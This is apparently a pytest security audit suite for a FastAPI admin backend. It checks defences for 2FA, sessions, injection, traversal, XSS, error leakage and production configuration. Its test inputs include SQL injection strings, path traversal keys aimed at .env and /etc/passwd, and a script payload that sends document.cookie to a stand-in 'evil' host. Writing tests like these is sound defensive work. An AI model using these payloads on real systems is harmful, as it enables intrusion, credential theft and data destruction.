"""
Phase 7 security audit suite.

These are adversarial tests. Each one states the attack in its name and asserts
the defence, so the matrix in `docs/PHASE-7-PRODUCTION-AUDIT.md` has evidence
behind it rather than a claim.

Where a test documents an accepted limitation rather than a defence, it says so
explicitly — a test that passes for the wrong reason is worse than no test.
"""

from __future__ import annotations

import io
import uuid

import pyotp
import pytest
from fastapi.testclient import TestClient
from sqlalchemy import func, select
from sqlalchemy.orm import Session

from app.api.admin.files import resolve_path
from app.core import security
from app.core.config import get_settings
from app.models.admin import AdminUser
from app.models.content import ContactMessage, MediaAsset, Project
from tests.conftest import ADMIN_EMAIL, ADMIN_PASSWORD

settings = get_settings()

PNG = (
    b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01"
    b"\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\nIDATx\x9cc\x00\x01"
    b"\x00\x00\x05\x00\x01\r\n-\xb4\x00\x00\x00\x00IEND\xaeB`\x82"
)


@pytest.fixture
def auth(client: TestClient, admin) -> str:
    response = client.post(
        "/api/auth/login", json={"email": ADMIN_EMAIL, "password": ADMIN_PASSWORD}
    )
    assert response.status_code == 200
    return response.cookies[settings.csrf_cookie_name]


def headers(csrf: str) -> dict[str, str]:
    return {settings.csrf_header_name: csrf}


@pytest.fixture
def totp_admin(client: TestClient, admin: AdminUser, db_session: Session) -> str:
    """An admin with 2FA actually enabled. Returns the TOTP secret."""
    secret = security.generate_totp_secret()
    admin.totp_secret = secret
    admin.totp_enabled = True
    db_session.commit()
    return secret


def pending_token(client: TestClient) -> str:
    response = client.post(
        "/api/auth/login", json={"email": ADMIN_EMAIL, "password": ADMIN_PASSWORD}
    )
    assert response.status_code == 200
    body = response.json()
    assert body["status"] == "two_factor_required"
    return body["pending_token"]


# ------------------------------------------------------------ 2FA hardening --


def test_second_factor_brute_force_is_rate_limited(
    client: TestClient, totp_admin: str, db_session: Session
) -> None:
    """
    A correct password buys a pending token. That token must not then allow
    unlimited guesses at the six-digit code for its whole lifetime.
    """
    token = pending_token(client)

    statuses = []
    for _ in range(settings.max_failed_logins + 3):
        response = client.post(
            "/api/auth/2fa", json={"pending_token": token, "code": "000000"}
        )
        statuses.append(response.status_code)

    assert 429 in statuses, (
        "unlimited 2FA guesses accepted — got "
        f"{statuses.count(401)} × 401 and no lockout"
    )

    # And the lockout is recorded on the account, so it survives an IP change.
    admin = db_session.scalar(select(AdminUser))
    assert admin.locked_until is not None


def test_a_used_totp_code_cannot_be_replayed(
    client: TestClient, totp_admin: str
) -> None:
    """
    RFC 6238 §5.2: a verifier must not accept the same OTP twice. Without this,
    an observed code stays usable for the rest of its window.
    """
    code = pyotp.TOTP(totp_admin).now()

    first = client.post(
        "/api/auth/2fa", json={"pending_token": pending_token(client), "code": code}
    )
    assert first.status_code == 200

    client.cookies.clear()
    second = client.post(
        "/api/auth/2fa", json={"pending_token": pending_token(client), "code": code}
    )
    assert second.status_code != 200, "the same TOTP code was accepted twice"


def test_reenrolment_cannot_silently_break_live_2fa(
    client: TestClient, totp_admin: str, db_session: Session
) -> None:
    """
    Starting setup again while 2FA is enabled would replace the secret while
    `totp_enabled` stays true — locking the owner out of their own account with
    no warning. It must be refused or handled explicitly.
    """
    code = pyotp.TOTP(totp_admin).now()
    login = client.post(
        "/api/auth/2fa", json={"pending_token": pending_token(client), "code": code}
    )
    assert login.status_code == 200
    csrf = login.cookies[settings.csrf_cookie_name]

    response = client.post("/api/auth/2fa/setup", json={}, headers=headers(csrf))

    admin = db_session.scalar(select(AdminUser))
    if response.status_code == 200:
        pytest.fail(
            "re-enrolment replaced the secret while 2FA stayed enabled; "
            f"authenticator now broken (secret changed: "
            f"{admin.totp_secret != totp_admin})"
        )
    assert admin.totp_secret == totp_admin


def test_recovery_code_is_single_use(
    client: TestClient, totp_admin: str, db_session: Session
) -> None:
    login = client.post(
        "/api/auth/2fa",
        json={
            "pending_token": pending_token(client),
            "code": pyotp.TOTP(totp_admin).now(),
        },
    )
    assert login.status_code == 200
    csrf = login.cookies[settings.csrf_cookie_name]

    # Full enrolment flow: stage a secret, then prove it, which is what mints
    # the recovery codes.
    setup = client.post(
        "/api/auth/2fa/setup",
        json={"current_password": ADMIN_PASSWORD},
        headers=headers(csrf),
    )
    assert setup.status_code == 200, setup.text
    new_secret = setup.json()["secret"]
    enabled = client.post(
        "/api/auth/2fa/enable",
        json={"code": pyotp.TOTP(new_secret).now()},
        headers=headers(csrf),
    )
    assert enabled.status_code == 200, enabled.text
    codes = enabled.json()["codes"]
    client.cookies.clear()

    recovery = codes[0]
    first = client.post(
        "/api/auth/2fa", json={"pending_token": pending_token(client), "code": recovery}
    )
    assert first.status_code == 200
    client.cookies.clear()

    second = client.post(
        "/api/auth/2fa", json={"pending_token": pending_token(client), "code": recovery}
    )
    assert second.status_code == 401, "a recovery code was accepted twice"


# ----------------------------------------------------------------- sessions --


def test_logout_invalidates_the_session_server_side(
    client: TestClient, auth: str
) -> None:
    assert client.get("/api/auth/me").status_code == 200
    assert client.post("/api/auth/logout", headers=headers(auth)).status_code == 204
    # Even replaying the cookie by hand must fail: revocation is server-side.
    assert client.get("/api/auth/me").status_code == 401


def test_login_issues_a_fresh_session_token(client: TestClient, admin) -> None:
    """Session fixation: a pre-set cookie value must never be adopted."""
    client.cookies.set(settings.session_cookie_name, "attacker-chosen-value")
    response = client.post(
        "/api/auth/login", json={"email": ADMIN_EMAIL, "password": ADMIN_PASSWORD}
    )
    assert response.status_code == 200
    assert response.cookies[settings.session_cookie_name] != "attacker-chosen-value"


def test_session_cookie_is_httponly_and_samesite(client: TestClient, admin) -> None:
    response = client.post(
        "/api/auth/login", json={"email": ADMIN_EMAIL, "password": ADMIN_PASSWORD}
    )
    raw = "; ".join(response.headers.get_list("set-cookie"))
    assert f"{settings.session_cookie_name}=" in raw
    assert "HttpOnly" in raw
    assert "samesite=lax" in raw.lower()
    # The CSRF cookie must NOT be HttpOnly — the client has to read it.
    csrf_cookie = [
        c
        for c in response.headers.get_list("set-cookie")
        if c.startswith(settings.csrf_cookie_name)
    ][0]
    assert "HttpOnly" not in csrf_cookie


# ------------------------------------------------------- injection & traversal --


@pytest.mark.parametrize(
    "payload",
    [
        "'; DROP TABLE projects; --",
        "' OR '1'='1",
        "1; DELETE FROM admin_users",
        '" UNION SELECT password_hash FROM admin_users --',
        "admin'--",
    ],
)
def test_sql_payloads_are_treated_as_data(
    client: TestClient, auth: str, db_session: Session, payload: str
) -> None:
    created = client.post(
        "/api/admin/projects",
        json={
            "slug": f"sqli-{abs(hash(payload)) % 10**6}",
            "title": payload,
            "category": "Test",
            "status": "local",
            "summary": payload,
        },
        headers=headers(auth),
    )
    assert created.status_code == 201, created.text

    # Stored verbatim as text, and the tables are all still there.
    row = db_session.scalar(select(Project).where(Project.title == payload))
    assert row is not None and row.title == payload
    assert db_session.scalar(select(func.count()).select_from(AdminUser)) == 1


@pytest.mark.parametrize(
    "key",
    [
        "uploads/../../../../Windows/win.ini",
        "uploads/../../.env",
        "assets/../../backend/.env",
        "..\\..\\.env",
        "/etc/passwd",
        "etc/passwd",
        "uploads/%2e%2e%2f.env",
    ],
)
def test_storage_keys_cannot_escape_their_root(key: str) -> None:
    """
    `resolve_path` is the only thing between a stored key and the filesystem.
    Anything that leaves the root must 404, not read a file.
    """
    from fastapi import HTTPException

    with pytest.raises(HTTPException) as caught:
        resolve_path(key)
    assert caught.value.status_code == 404


def test_media_file_route_requires_a_session(
    client: TestClient, auth: str, db_session: Session
) -> None:
    upload = client.post(
        "/api/admin/media",
        files={"file": ("x.png", io.BytesIO(PNG), "image/png")},
        headers=headers(auth),
    )
    assert upload.status_code in (200, 201)
    media_id = upload.json()["id"]

    client.cookies.clear()
    assert client.get(f"/api/admin/media/{media_id}/file").status_code == 401


def test_private_media_file_is_still_session_gated(
    client: TestClient, auth: str, db_session: Session
) -> None:
    """
    A withheld document must not be reachable by guessing its id. The public
    site never serves from the API at all, so this route is admin-only whatever
    the asset's flags say.
    """
    row = MediaAsset(
        kind="document",
        storage_key="uploads/document/withheld.pdf",
        original_filename="withheld.pdf",
        content_type="application/pdf",
        byte_size=10,
        checksum="deadbeef",
        is_public=False,
    )
    db_session.add(row)
    db_session.commit()

    client.cookies.clear()
    assert client.get(f"/api/admin/media/{row.id}/file").status_code == 401


# ---------------------------------------------------------------------- IDOR --


@pytest.mark.parametrize(
    "path",
    [
        "/api/admin/projects/{id}",
        "/api/admin/media/{id}",
        "/api/admin/messages/{id}",
        "/api/admin/publish/snapshots/{id}",
    ],
)
def test_unknown_object_ids_are_404_not_500(
    client: TestClient, auth: str, path: str
) -> None:
    response = client.get(path.format(id=uuid.uuid4()))
    assert response.status_code == 404, response.text


@pytest.mark.parametrize(
    "path",
    [
        "/api/admin/projects/not-a-uuid",
        "/api/admin/media/../../etc/passwd",
        "/api/admin/messages/1 OR 1=1",
        "/api/admin/publish/snapshots/%00",
    ],
)
def test_malformed_object_ids_are_rejected_cleanly(
    client: TestClient, auth: str, path: str
) -> None:
    response = client.get(path)
    assert response.status_code in (400, 404, 422), response.text
    assert "Traceback" not in response.text


# ------------------------------------------------------- contact abuse & XSS --


def test_contact_stores_script_payloads_as_inert_text(
    client: TestClient, db_session: Session
) -> None:
    """
    The API stores what was sent; React escapes it on render. What must NOT
    happen is the API pretending to sanitise and the admin then trusting it.
    """
    payload = "<script>fetch('//evil/'+document.cookie)</script>"
    response = client.post(
        "/api/public/contact",
        json={
            "name": "XSS Probe",
            "email": "probe@example.com",
            "subject": payload,
            "message": f"A message containing {payload} inline.",
        },
    )
    assert response.status_code == 200

    row = db_session.scalars(select(ContactMessage)).one()
    assert row.subject == payload
    assert payload in row.body
    # And it comes back out of the API as data, not as a rendered document.
    assert response.headers["content-type"].startswith("application/json")


def test_oversized_contact_body_is_rejected(
    client: TestClient, db_session: Session
) -> None:
    response = client.post(
        "/api/public/contact",
        json={
            "name": "Flood",
            "email": "flood@example.com",
            "subject": "x" * 300,
            "message": "y" * 200_000,
        },
    )
    assert response.status_code in (413, 422)
    assert db_session.scalar(select(func.count()).select_from(ContactMessage)) == 0


def test_a_huge_request_body_is_refused_before_it_is_buffered(
    client: TestClient,
) -> None:
    """
    The public endpoint is reachable by anyone, so an unbounded body is a free
    memory-exhaustion primitive regardless of what the field validators say.
    """
    response = client.post(
        "/api/public/contact",
        content=b"{" + b'"x":"' + b"A" * (5 * 1024 * 1024) + b'"}',
        headers={"Content-Type": "application/json"},
    )
    assert response.status_code == 413, (
        f"a 5 MB body was accepted with {response.status_code}"
    )


def test_contact_errors_do_not_leak_internals(client: TestClient) -> None:
    response = client.post("/api/public/contact", json={"name": "only a name"})
    assert response.status_code == 422
    body = response.text
    for leak in ("Traceback", "sqlalchemy", "psycopg", "\\backend\\", "/app/"):
        assert leak not in body


# ------------------------------------------------------- responses & headers --


def test_security_headers_are_present_on_api_responses(client: TestClient) -> None:
    response = client.get("/api/health")
    assert response.headers["X-Content-Type-Options"] == "nosniff"
    assert response.headers["X-Frame-Options"] == "DENY"
    assert "frame-ancestors 'none'" in response.headers["Content-Security-Policy"]
    assert response.headers["Referrer-Policy"] == "no-referrer"


def test_admin_responses_are_not_cacheable(client: TestClient, auth: str) -> None:
    """A shared cache must never hold an authenticated admin response."""
    response = client.get("/api/admin/projects")
    assert "no-store" in response.headers.get("Cache-Control", "")


def test_unhandled_error_returns_a_clean_500() -> None:
    """
    The 500 handler must replace the traceback, not append to it.

    `raise_server_exceptions=False` is required: the default TestClient
    re-raises the original exception after the handler has run, which hides the
    response a real HTTP peer would actually receive.
    """
    from app.main import app

    @app.get("/api/_audit_boom")
    def boom() -> dict:  # pragma: no cover - exercised via the request below
        raise RuntimeError("secret internal detail: postgres://u:p@host/db")

    try:
        peer = TestClient(app, raise_server_exceptions=False)
        response = peer.get("/api/_audit_boom")
        assert response.status_code == 500
        assert response.headers["content-type"].startswith("application/json")
        assert "secret internal detail" not in response.text
        assert "postgres://" not in response.text
        assert "Traceback" not in response.text
        assert response.json()["detail"]["code"] == "internal_error"
    finally:
        app.router.routes = [
            r
            for r in app.router.routes
            if getattr(r, "path", None) != "/api/_audit_boom"
        ]


# --------------------------------------------------------- bounded responses --


def test_message_list_is_bounded(
    client: TestClient, db_session: Session, auth: str
) -> None:
    """
    An unauthenticated endpoint feeds this table. If the admin list is
    unbounded, a flood turns the inbox into a response nobody can load.
    """
    from app.models.base import utcnow

    for i in range(120):
        db_session.add(
            ContactMessage(
                name=f"Sender {i}",
                email=f"s{i}@example.com",
                body="x" * 200,
                created_at=utcnow(),
            )
        )
    db_session.commit()

    response = client.get("/api/admin/messages")
    assert response.status_code == 200
    returned = len(response.json())
    assert returned < 120, f"all {returned} rows returned with no limit"


# ------------------------------------------------------ production config --


def production_settings(**overrides):
    """A minimal production config that passes the startup checks."""
    from app.core.config import Settings

    base = {
        "environment": "production",
        "database_url": "postgresql+psycopg://u:p@h/db",
        "secret_key": "x" * 40,
        "cors_origins": "https://example.org",
        "allowed_hosts": "api.example.org",
        # Deployment settings, required in production since Phase 8.
        "trusted_proxy_count": 1,
        "storage_root": "/var/data/storage",
    }
    return Settings(**{**base, **overrides})


def test_production_environment_forces_secure_cookies() -> None:
    from app.core.config import Settings

    assert production_settings().cookies_secure is True

    development = Settings(
        environment="development",
        database_url="postgresql+psycopg://u:p@h/db",
        secret_key="x" * 40,
    )
    assert development.cookies_secure is False


@pytest.mark.parametrize(
    "overrides",
    [
        # A wildcard with credentialed CORS is both invalid and dangerous.
        {"cors_origins": "*"},
        {"cors_origins": "http://localhost:5173"},
        {"cors_origins": "http://127.0.0.1:5173"},
        # Plain http in production means the session cookie can be stripped.
        {"cors_origins": "http://example.org"},
        {"cors_origins": ""},
        # An empty or localhost host allow-list is the bug this replaced.
        {"allowed_hosts": ""},
        {"allowed_hosts": "localhost"},
        {"allowed_hosts": "*"},
    ],
)
def test_production_refuses_to_start_when_misconfigured(overrides: dict) -> None:
    """
    Every one of these is silent at boot and only visible from a browser
    console, or from an audit months later. Failing on startup is cheaper.
    """
    with pytest.raises(ValueError):
        production_settings(**overrides)


def test_production_accepts_a_real_configuration() -> None:
    configured = production_settings(
        cors_origins="https://example.org,https://www.example.org",
        allowed_hosts="api.example.org,example.org",
    )
    assert "api.example.org" in configured.allowed_hosts
    assert "localhost" not in configured.allowed_hosts
    assert configured.cors_origins == [
        "https://example.org",
        "https://www.example.org",
    ]


def test_development_is_left_alone() -> None:
    """The checks must not make local development awkward."""
    from app.core.config import Settings

    development = Settings(
        environment="development",
        database_url="postgresql+psycopg://u:p@h/db",
        secret_key="x" * 40,
        cors_origins="http://localhost:5173",
    )
    assert development.cookies_secure is False
    assert development.allowed_hosts == []
